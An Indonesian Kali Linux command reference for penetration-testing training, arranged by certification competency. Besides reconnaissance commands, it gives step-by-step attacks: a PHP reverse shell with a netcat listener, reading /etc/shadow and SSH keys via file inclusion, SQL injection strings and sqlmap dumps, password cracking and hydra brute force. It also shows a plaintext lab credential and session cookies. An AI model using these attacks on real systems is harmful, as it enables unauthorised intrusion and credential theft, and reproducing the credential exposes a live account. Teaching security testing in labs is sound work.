# Referensi Sintaks

Kumpulan sintaks/command dasar Kali Linux untuk pengujian keamanan siber (info gathering, vulnerability assessment, exploitation).

---

## J.62UKS00.005.1 — Mengumpulkan informasi yang diperlukan untuk pengujian keamanan siber

### Netdiscover
```
netdiscover -r 10.0.2.0/24
```

### NMAP
```
nmap --top-ports 10 --open -r 10.0.2.0/24
nmap 10.0.2.7
nmap -p- --open -A 10.0.2.7
nmap -p- --open -A --script vuln 10.0.2.7
nmap 10.0.2.7 -sV -sC
nmap -p- -sV 10.0.2.7
```

### Dirbuster
```
dirb http://10.0.2.7
dirb http://10.0.2.7:8080
dirb http://10.0.2.7 -X .php,.html,.txt
dirb http://10.0.2.7 -w /usr/share/wordlists/dirb/common.txt
dirb http://10.0.2.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### DirSearch
```
dirsearch -u http://10.0.2.7
dirsearch -u http://10.0.2.7:8080
dirsearch -u http://10.0.2.7 -w /usr/share/wordlists/dirb/common.txt
dirsearch -u http://10.0.2.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Nuclei
```
nuclei -u 10.0.2.7
```


### Nikto
```
nikto -h 10.0.2.7
```

---

## J.62UKS00.006.1 — Mencari kerentanan sesuai ruang lingkup pengujian keamanan siber

### Kali Linux (offline)
```
searchsploit vsftpd 2.3.4
searchsploit -p 17491        # mencari detail kerentanan
```

### NMAP (Kerentanan Port)
```
nmap -p 21 10.0.2.7 -sV -sC
```

### Metasploit
```
msfconsole
search vsftpd 2.3.4
use 0
set payload
show options
set RHOSTS 10.0.2.7
run
```

---

## J.62UKS00.007.1 — Menguji kerentanan pada objek pengujian

### HTTP

**Interesting Directory**
- `/admin` : Brute Force *username – password*
- `/database` : Password cracking (`*.sql`)
- `/wp-plugin` : Exploit WP Plugin

**Interesting File**
- `*.php` (*Missing parameter*, phpInfo, config)
- `*.sql` (*Database dumping*)
- `*.txt` (*Credential*, robots.txt)

**Database Error**
- *Path error DB unhandling* (penyisipan karakter petik `'`)

#### Exploit pada WordPress

Bypass DNS pada path yang ditemukan (i.e., `/secret/wplogin.php`)
```
nano /etc/hosts
```

Exploit dengan *WPScan* untuk mendapatkan *username* (i.e., admin)
```
wpscan --url http://vtcsec/secret --enumerate u
```

*Bruteforce*
```
wpscan --url http://vtcsec/secret -U admin -P /usr/share/wordlists/dirb/common.txt
```

Cari path yang dapat diedit (php), unggah *payload reverse shell*
```
locate php-reverse-shell.php
cp -a /usr/share/webshells/php /home/kali
nano /home/kali/php-reverse-shell.php     # edit IP Host dan Port: 7777
```

Salin isi *shell* ke path php yang dapat diedit / fitur unggah file dan unggah, menggunakan info dari Dirbuster cari kemungkinan *path* yang menampilkan file unggah, lalu klik untuk eksekusi.

Eksploitasi *listening* dengan *Netcat*
```
nc -lvp 7777      # Editing Port
nc -v target.com 7773
```

Akses direktori kredensial *username* & *password*
```
cd /etc/shadow
cd /etc/passwd
```

Salin *password* ke Kali Linux
```
nano wp_password
```

Dekripsi *password file*
```
cat wp_password | wc -c      # mencari jumlah string
john --single wp_password
john --single --format=raw-sha256 wp_password
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 wp_password
john --incremental --format=raw-sha256 wp_password
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt wp_password
```

Hasil *cracking* disimpan otomatis
```
cat /root/.john/john.pot
```

*Login* SSH dengan kredensial tersebut
```
ssh nama_user@alamatIP
sudo -l
```

**Privilage Escalation (root)**
```
find / -perm -u=s -type f 2>/dev/null
nmap --interactive
!sh
```

#### SQL Injection

Pada *info gathering* dari Dirbuster/Nikto, cari *path* yang mungkin rentan
```
10.0.2.7:38080/cat.php?id=1      # tambahkan karakter petik ' sebelum 1
'or 1=1;--                       # untuk inject pada login path
' or 1=1 -- -
admin' -- -
```

*Injection* dengan SQLMap
```
sqlmap -u http://10.0.2.7:38080/cat.php?id=1 --dbs
sqlmap -u http://10.0.2.7:38080/cat.php?id=1 -D nama_db --tables
sqlmap -u http://10.0.2.7:38080/cat.php?id=1 -D nama_db -T nama_table --columns
sqlmap -u http://10.0.2.7:38080/cat.php?id=1 -D nama_db -T nama_table --dump
```

Jika server memvalidasi CSRF token:
```
sqlmap -u "http://labkamal.online:8085/search.php?q=test" \
  --cookie="_xsrf=2la8df500djd62212558698O94382...;PHPSESSID=b55a5b5be...;session_id=2l1:0!10:1788767457l10:session_idl2" \
  --csrf-token="_xsrf" \
  --csrf-url="http://labkamal.online:8085/search.php" \
  -p q \
  --dbs \
  --batch
```

Flush session lama untuk target ini
```
sqlmap -u "http://192.168.32.122:8000/news/detail?id=1" --flush-session
```

Lalu jalankan dump lagi
```
sqlmap -u "http://192.168.32.122:8000/news/detail?id=1" \
  -D gazette -T users -C id,username,password,role \
  --dump --batch --threads=1
```

Dump ke file
```
sqlmap -u "http://labkamal.online:8085/search.php?q=test" \
  -p q \
  --dump-all \
  --batch \
  -o output.txt
```

Jika akses memerlukan login Basic Auth
```
sqlmap -u "http://labkamal.online:8079/sqli/lab2_union.php?id=1" \
  --auth-type=Basic \
  --auth-cred="training:dsWEzI5358HiJ5H6z9kC" \
  --batch
```

*Login* dengan kredensial yang didapatkan, lalu cari path php yang dapat diedit atau fitur unggah. Lakukan eksploitasi dengan payload reverse shell seperti keterangan sebelumnya.

#### Local File Inclusion

Mencari path rentan berdasarkan *info gathering* dari Dirbuster atau Nikto.
```
http://10.0.2.7/website.php      # response: Missing GET parameter
```

Gunakan *FFuF* (*fuzzer web*) untuk mencari direktori yang dapat dieksploitasi (i.e., `/etc/passwd`)
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.7/website.php?FUZZ=/etc/passwd -fs 80
```

Mendapat kata kunci pengganti FUZZ (i.e., "keywords"), eksploitasi
```
http://10.0.2.7/website.php?keywords=/etc/passwd
```

Eksploitasi pada `/etc/shadow`
```
http://10.0.2.7/website.php?keywords=/etc/shadow
```

Cari *user* yang memiliki akses ke Bash. Akses direktori yang menyimpan Private Key RSA (i.e., alpha)
```
http://10.0.2.7/website.php?keywords=/home/alpha/.ssh/id_rsa
```

Salin dan *decoding* RSA Key tersebut
```
nano alpha_rsa.txt
locate ssh2john.py      # lalu salin ke /home/kali
python3 ssh2john.py alpha_rsa.txt > alpha.hash
sudo chmod 600 alpha_rsa.txt      # jika respon denied
```

Dekripsi nilai hash
```
john --wordlist=/usr/share/wordlists/rockyou.txt alpha.hash
```

Setelah mendapatkan *password*, login via SSH
```
ssh -i alpha_rsa.txt alpha@10.0.2.7
history
sudo -l      # jika ada keterangan (ALL) ALL maka sudah sudoers
sudo su
```

### Non-HTTP

#### Port 21 - FTP

Pada *info gathering* cek informasi pada Port 21, apakah ada note "Anonymous FTP login allowed", jika ada:
```
ftp 10.2.0.7      # anonymous : anonymous
```

Cek file yang di-*share*, apakah ada keterangan file yang di-*share*
```
ls
get dataku.txt      # unduh file
```

#### Port 22 - SSH

Pada *info gathering* cek informasi pada Port 22, didapatkan *path* aktif `/development` lalu cek isi file `dev.txt` dan `j.txt`. Mendapatkan informasi bahwa terdapat 2 user yaitu J dan K.

Cari *user* tersebut
```
enum4linux 10.0.2.7
```

Lakukan *bruteforce* pada *password* milik *user*
```
hydra -l jan -P /usr/share/wordlists/dirb/common.txt 10.0.2.7 ssh -vV -f -t 4
hydra -L user.txt -P /wordlist.txt 10.0.2.7 ssh
```

Login via SSH jan dengan *password* yang didapatkan
```
ssh jan@10.0.2.7
whoami
id
```

Cek direktori penting
```
ls -al
cd kay
```

Terdapat informasi berupa file `pass.bak` dan `.viminfo`, manfaatkan vim untuk membuka `pass.bak`. Gunakan `pass.bak` untuk akses `sudo su`.

### Jenis Kerentanan
- SQL Injection
- Local File Inclusion
- Sensitive Data Exposure
- Failure to Handle Missing Parameter
- Arbitrary File Upload

### Daftar Wordlist
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/rockyou.txt`

### Daftar WebShell
- `/usr/share/webshells/php/php-reverse-shell.php`
- `tree /usr/share/webshells/` (melihat daftar isi direktori)

---

## HTTP Header Enumeration (tambahan)

**curl**
```
curl -I http://target.com          # hanya header, request HEAD
curl -v http://target.com          # header + body, tampilkan proses request-response
curl -s -D - http://target.com -o /dev/null   # dump header saja ke stdout
curl -u "training:dsWEzI5358HiJ5H6z9kC" "http://target.com/"      # jika web memiliki login
```

**wget**
```
wget --server-response --spider http://target.com
```

**httpie**
```
http --headers target.com
```

**netcat (nc)** — manual raw HTTP request, bagus buat banner grabbing
```
printf "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

**nmap**
```
nmap -p 80,443 --script http-headers target.com
nmap -p 80,443 --script http-security-headers target.com   # cek header security seperti CSP, HSTS
```

**whatweb** — fingerprint teknologi web (server, CMS, framework) dari header + konten
```
whatweb target.com
```

**httpx** (ProjectDiscovery)
```
echo target.com | httpx -title -status-code -server -tech-detect
```

Untuk intercept & modify request/response secara interaktif: **Burp Suite** atau **OWASP ZAP** (GUI proxy, sudah terpasang di Kali).
